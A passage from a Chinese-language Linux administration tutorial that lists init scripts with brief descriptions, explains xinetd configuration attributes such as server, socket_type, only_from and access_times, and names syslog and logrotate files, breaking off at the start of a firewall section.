<td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> gpm</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 终端中的鼠标支持</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> halt</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 关闭系统</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> hdparm</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 调整硬盘的脚本，配置文件为&nbsp;/etc/hdparm.conf</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> hibernate</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 系统休眠</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> hotplug and hotplug-net</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 即插即用支持，比较复杂，建议不要动它</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> ifrename</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 网络接口重命名脚本。如果您有十块网卡，您应该开启它</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> inetd</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 配置文件为&nbsp;/etc/inetd.conf</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> linux-restricted-modules-common</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 受限模块支持。</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> lvm</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 逻辑卷管理系统支持</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> makedev</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 创建设备文件，非常重要</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> mdamd</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 磁盘阵列</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> module-init-tools</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 从/etc/modules加载扩展模块，建议开启</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> networking</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 网络支持。按&nbsp;/etc/network/interfaces&nbsp;文件预设激活网络，非常重要</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> ntpdate</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 时间同步服务，建议关闭</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> pcmcia</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> pcmcia 设备支持</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> powernowd</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 移动 CPU 节能支持</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> ppp</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 拨号连接</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> readahead</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 预加载库文件</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> reboot</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 别动它</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> resolvconf</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 自动配置 DNS</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> rmnologin</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 清除 nologin</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> rsync</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> rsync 守护程序</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> sendsigs</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 在重启和关机期间发送信号</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> single</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 激活单用户模式</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> sshd</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> ssh服务器</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> sudo</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 检查 sudo 状态</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> udev</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 用户空间 dev文件系统（userspace dev filesystem）。重要</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> umountfs</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 卸载文件系统</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> urandom</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 随机数生成器</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> usplash</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 开机画面支持</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> vbesave</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 显卡 BIOS 配置工具。保存显卡的状态</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> xorg-common</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 设置 X 服务 ICE socket</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> adjtimex</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 调整核心时钟的工具</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> dirmngr</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 证书列表管理工具</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> hwtools</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> irqs 优化工具</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> libpam-devperm</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 系统崩溃之后，用于修理设备文件许可的守护程序</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> lm-sensors</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 板载传感器支持</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> mdadm-raid</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 磁盘陈列管理器</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> screen-cleanup</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 清除开机屏幕的脚本</td>   </tr>   <tr>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> xinetd</td>    <td style="border-bottom-style:solid; border-bottom-width:1px; border-bottom-color:rgb(221,221,221); border-right-style:solid; border-right-width:1px; border-right-color:rgb(221,221,221); padding:5px 10px"> 新一代的网络守护进程服务程序（extended internet daemon）</td>   </tr>  </tbody> </table><p>super deamon 具体配置文件（/etc/xinetd.d/*）里面的参数选项</p><ul><li><strong>文件格式</strong>：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">service &lt;service_name&gt;</span><br><span class="line">&#123;</span><br><span class="line">    &lt;attribute&gt; &lt;option&gt; &lt;value&gt; &lt;value&gt; ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#-------------------------------------------------------</span><br><span class="line">#其中option 有以下几种:</span><br><span class="line">=: </span><br><span class="line">+=:</span><br><span class="line">-=:</span><br><span class="line"></span><br><span class="line">`</span><br></pre></td></tr></table></figure></li></ul><table><tbody><tr align="center" bgcolor="#182448">    <td width="120"><font color="#000">attribute (功能)</font></td><td><font color="#0">说明与范例</font></td></tr><tr bgcolor="#182448"><td colspan="2"><span class="text_import1"><font color="#000000">一般配置项目：服务的识别、启动与程序</font></span></td></tr><tr>    <td align="center"><span class="text_import1" style="font-family: '细明体';">disable<br>(启动与否)</span></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[yes|no]，默认 disable = yes</li></ul>        disable 为取消的意思，此值可配置该服务是否要启动。默认所有的 super daemon 管理的服务都不启动的。        若要启动就得要配置为『 disable = no 』</td></tr><tr>    <td align="center"><font face="细明体">id<br>(服务识别)</font></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[服务的名称]</li></ul>        虽然服务在配置文件开头『 service 服务名称』已经指定了，不过有时后会有重复的配置值，此时可以用 id 来取代服务名称。        你可以参考一下 /etc/xinetd.d/time-stream 来思考一下原理。</td></tr><tr>    <td align="center"><span class="text_import1" style="font-family: '细明体';">server<br>(程序文件名)</span></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[program 的完整檔名]</li></ul>        这个就是指出这个服务的启动程序！例如 /usr/bin/rsync 为启动 rsync 服务的命令，所以这个配置值就会成为：        『 server = /usr/bin/rsync 』</td></tr><tr>    <td align="center"><font face="细明体">server_args<br>(程序参数)</font></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[程序相关的参数]</li></ul>        这里应该输入的就是你的 server 那里需要输入的一些参数啦！例如 rsync 需要加入 --daemon ，        所以这里就配置：『 server_args = --daemon 』。与上面 server 搭配，最终启动服务的方式『/usr/bin/rsync --daemon』</td></tr><tr>    <td align="center"><font face="细明体">user<br>(服务所属UID)</font></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[使用者账号]</li></ul>        如果 xinetd 是以 root 的身份启动来管理的，那么这个项目可以配置为其他用户。此时这个 daemon         将会以此配置值指定的身份来启动该服务的程序喔！举例来说，你启动 rsync 时会以这个配置值作为该程序的 UID。</td></tr><tr>    <td align="center"><font face="细明体">group</font></td>    <td>跟 user 的意思相同！此项目填入组名即可。</td></tr><tr bgcolor="#182448"><td colspan="2"><span class="text_import1"><font color="#FFFFFF">一般配置项目：联机方式与联机封包协议</font></span></td></tr><tr>    <td align="center"><font face="细明体">socket_type<br>(封包类型)</font></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[stream|dgram|raw]，与封包有关</li></ul>        stream 为联机机制较为可靠的 TCP 封包，若为 UDP 封包则使用 dgram 机制。raw 代表 server 需要与 IP         直接对谈！举例来说 rsync 使用 TCP ，故配置为『socket_type = stream 』</td></tr><tr>    <td align="center"><font face="细明体">protocol<br>(封包类型)</font></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[tcp|udp]，通常使用 socket_type 取代此配置</li></ul>        使用的网络协议，需参考 /etc/protocols 内的通讯协议，一般使用 tcp 或 udp。由于与 socket_type 重复，        因此这个项目可以不指定。</td></tr><tr>    <td align="center"><font face="细明体">wait<br>(联机机制)</font></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[yes(single)|no(multi)]，默认 wait = no</li></ul>        这就是我们刚刚提到的 <b>Multi-threaded</b> 与 <b>single-threaded</b>         ！一般来说，我们希望大家的要求都可以同时被激活，所以可以配置『 wait = no 』        此外，一般 udp 配置为 yes 而 tcp 配置为 no。</td></tr><tr>    <td align="center"><font face="细明体">instances<br>(最大联机数)</font></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[数字或 UNLIMITED]</li></ul>        这个服务可接受的最大联机数量。如果你只想要开放 30 个人联机 rsync 时，可在配置文件内加入：『        instances = 30 』</td></tr><tr>    <td align="center"><font face="细明体">per_source<br>(单一用户来源)</font></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[一个数字或 UNLIMITED]</li></ul>        如果想要控制每个来源 IP 仅能有一个最大的同时联机数，就指定这个项目吧！例如同一个 IP 最多只能连 10 条联机『        per_source = 10 』</td></tr><tr>    <td align="center"><font face="细明体">cps<br>(新联机限制)</font></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[两个数字]</li></ul>        为了避免短时间内大量的联机要求导致系统出现忙碌的状态而有这个 cps 的配置值。第一个数字为一秒内能够接受的最多新联机要求，        第二个数字则为，若超过第一个数字那暂时关闭该服务的秒数。</td></tr><tr bgcolor="#182448"><td colspan="2"><span class="text_import1"><font color="#FFFFFF">一般配置项目：登录文件的记录</font></span></td></tr><tr>    <td align="center"><font face="细明体">log_type<br>(登录档类型)</font></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[登录项目  等级]</li></ul>        当数据记录时，以什么登录项目记载？且需要记载的等级为何(默认为 info 等级)。这两个配置值得要看过<a href="http://cn.linux.vbird.org/linux_basic/0570syslog.php" target="_blank" rel="noopener">下一章登录档</a>后才会知道哩！这边你先有印象即可。</td></tr><tr>    <td align="center"><font face="细明体">log_on_success<br>log_on_failure<br>(登录状态)</font></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[PID,HOST,USERID,EXIT,DURATION]</li></ul>        在『成功登陆』或『失败登陆』之后，需要记录的项目：PID 为纪录该 server 启动时候的 process ID ，        HOST 为远程主机的 IP、USERID 为登陆者的账号、EXIT 为离开的时候记录的项目、DURATION 为该用户使用此服务多久？</td></tr><tr bgcolor="#182448"><td colspan="2"><span class="text_import1"><font color="#FFFFFF">进阶配置项目：环境、网络端口口与联机机制等</font></span></td></tr><tr>    <td align="center"><font face="细明体">env<br>(额外变量配置)</font></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[变量名称=变量内容]</li></ul>        这一个项目可以让你配置环境变量，环境变量的配置守则可以参考<a href="http://cn.linux.vbird.org/linux_basic/0320bash.php#variable_rule" target="_blank" rel="noopener">第十一章</a>。</td></tr><tr>    <td align="center"><font face="细明体">port<br>(非正规埠号)</font></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[一组数字(小于 65534)]</li></ul>        这里可以配置不同的服务与对应的 port ，但是请记住你的 port 与服务名称必须与 /etc/services         内记载的相同才行！不过，若服务名称是你自定义的，那么这个 port 就可以随你指定</td></tr><tr>    <td align="center"><font face="细明体">redirect<br>(服务转址)</font></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[IP port]</li></ul>        将 client 端对我们 server 的要求，转到另一部主机上去！呵呵！这个好玩呦！        例如当有人要使用你的 ftp 时，你可以将他转到另一部机器上面去！那个 IP_Address         就代表另一部远程主机的 IP 啰！</td></tr><tr>    <td align="center"><font face="细明体">includedir<br>(呼叫外部配置)</font></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[目录名称]</li></ul>        表示将某个目录底下的所有文件都给他塞进来 xinetd.conf 这个配置里头！这东西有用多了，        如此一来我们可以一个一个配置不同的项目！而不需要将所有的服务都写在 xinetd.conf         当中！你可以在 /etc/xinetd.conf 发现这个配置呦！</td></tr><tr bgcolor="#182448"><td colspan="2"><span class="text_import1"><font color="#000000">安全控管项目：</font></span></td></tr><tr>    <td align="center"><font face="细明体">bind<br>(服务接口锁定)</font></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[IP]</li></ul>        这个是配置『允许使用此一服务的适配卡』的意思！举个例子来说，你的 Linux         主机上面有两个 IP ，而你只想要让 IP1 可以使用此一服务，但 IP2         不能使用此服务，这里就可以将 IP1 写入即可！那么 IP2 就不可以使用此一 server 啰</td></tr><tr>    <td align="center"><font face="细明体">interface</font></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[IP]</li></ul>        与 bind 相同</td></tr><tr>    <td align="center"><font face="细明体">only_from<br>(防火墙机制)</font></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[0.0.0.0, 192.168.1.0/24, hostname, domainname]</li></ul>        这东西用在安全机制上面，也就是管制『只有这里面规定的 IP 或者是主机名可以登陆！』如果是         0.0.0.0 表示所有的 PC 皆可登陆，如果是 192.168.1.0/24 则表示为 C class 的网域！亦即由         192.168.1.1 ~ 192.168.1.255 皆可登陆！另外，也可以选择 domain name ，例如         .dic.ksu.edu.tw 就可以允许昆山资传系网域的 IP 登陆你的主机使用该 server ！</td></tr><tr>    <td align="center"><font face="细明体">no_access<br>(防火墙机制)</font></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[0.0.0.0, 192.168.1.0/24, hostname, domainname]</li></ul>        跟 only_from 差不多啦！就是用来管理可否进入你的 Linux 主机激活你的 server 服务的管理项目！         no_access 表示『不可登陆』的 PC 啰！</td></tr><tr>    <td align="center"><font face="细明体">access_times<br>(时间控管)</font></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[00:00-12:00, HH:MM-HH:MM]</li></ul>        这个项目在配置『该服务 server 启动的时间』，使用的是 24 小时的配置！例如你的 ftp 要在         8 点到 16 点开放的话，就是： 08:00-16:00。</td></tr><tr>    <td align="center"><font face="细明体">umask</font></td>    <td><ul style="margin: 5px 0pt; padding-left: 25px; font-family: '细明体'; color: rgb(0, 0, 136);">        <li>配置值：[000, 777, 022]</li></ul>        还记得在<a href="http://cn.linux.vbird.org/linux_basic/0220filemanager.php#umask" target="_blank" rel="noopener">第七章提到的 umask</a> 这个东西吗？呵呵！没错！        就是那个鬼玩意儿啰！可以配置用户创建目录或者是文件时候的属性！系统建议值是 022 。</td></tr></tbody></table><h1 id="日志配置文件"><a href="#日志配置文件" class="headerlink" title="日志配置文件"></a>日志配置文件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#syslogd 服务的配置文件(记录了日志的危险等级以及存储的文件path)</span><br><span class="line">/etc/syslog.conf</span><br><span class="line"></span><br><span class="line">#日志轮替logrotate 服务的配置文件</span><br><span class="line">/etc/logrotate.conf #主要配置</span><br><span class="line">/etc/logrotate.d/* #详细配置</span><br><span class="line"></span><br><span class="line">#常用日志文件位于/var/log/*</span><br><span class="line"></span><br><span class="line">boot.log #启动日志</span><br><span class="line">cron #例行性工作日志</span><br><span class="line">maillog #系统邮件发送日志</span><br><span class="line">syslog #系统生成日志</span><br><span class="line">dmseg  #系统内核日志</span><br><span class="line">wtmp   #记录用户登陆的信息</span><br></pre></td></tr></table></figure><h1 id="防火墙设置"><a href="#防火墙设置" class="headerlink" 